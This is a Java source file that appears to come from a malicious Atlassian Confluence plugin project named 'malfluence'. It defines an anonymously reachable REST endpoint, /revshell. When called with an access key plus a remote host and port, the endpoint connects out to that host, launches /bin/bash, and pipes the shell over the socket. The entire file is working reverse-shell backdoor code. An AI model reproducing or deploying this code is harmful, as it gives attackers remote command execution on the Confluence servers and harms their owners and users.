package com.cyllective.malfluence.rest;

import com.cyllective.malfluence.helpers.Log;

import com.atlassian.plugins.rest.common.security.AnonymousAllowed;

import javax.ws.rs.*;
import javax.ws.rs.core.MediaType;
import javax.ws.rs.core.Response;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.Arrays;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

@Path("/revshell")
public class RevShell {

    @GET
    @AnonymousAllowed
    @Produces(MediaType.TEXT_PLAIN)
    public Response ListPages(@QueryParam("accesskey") String accesskey, @QueryParam("rhost") String rhost, @QueryParam("rport") String rport) {

        try {
            if (!Auth.IsValidKey(accesskey)) {
                return Response
                        .status(Response.Status.FORBIDDEN)
                        .build();
            }

            if (rhost == null) {
                String message = "Invalid parameter rhost";
                Log.Debug(message);
                return Response
                        .status(Response.Status.BAD_REQUEST)
                        .entity(message)
                        .build();
            }

            if (rport == null) {
                String message = "Invalid parameter rport";
                Log.Debug(message);
                return Response
                        .status(Response.Status.BAD_REQUEST)
                        .entity(message)
                        .build();
            }

            Socket socket = new Socket(rhost, Integer.parseInt(rport));
            Process process = new ProcessBuilder("/bin/bash")
                    .redirectErrorStream(true)
                    .start();
            InputStream processInputStream = process.getInputStream();
            InputStream processErrorStream = process.getErrorStream();
            OutputStream processOutputStream = process.getOutputStream();
            InputStream socketInputStream = socket.getInputStream();
            OutputStream socketOutputStream = socket.getOutputStream();
            ExecutorService executor = Executors.newCachedThreadPool();

            executor.submit(() -> {
                try {
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = socketInputStream.read(buffer)) != -1) {
                        processOutputStream.write(buffer, 0, bytesRead);
                        processOutputStream.flush();
                    }
                } catch (IOException ignored) {}
            });

            executor.submit(() -> {
                try {
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = processInputStream.read(buffer)) != -1) {
                        socketOutputStream.write(buffer, 0, bytesRead);
                        socketOutputStream.flush();
                    }
                } catch (IOException ignored) {}
            });

            executor.submit(() -> {
                try {
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = processErrorStream.read(buffer)) != -1) {
                        socketOutputStream.write(buffer, 0, bytesRead);
                        socketOutputStream.flush();
                    }
                } catch (IOException ignored) {}
            });

            process.waitFor();
            executor.shutdownNow();

            return Response
                    .status(Response.Status.OK)
                    .build();

        } catch (Exception e) {
            Log.Error(e);
            return Response
                    .status(Response.Status.INTERNAL_SERVER_ERROR)
                    .build();
        }
    }
}


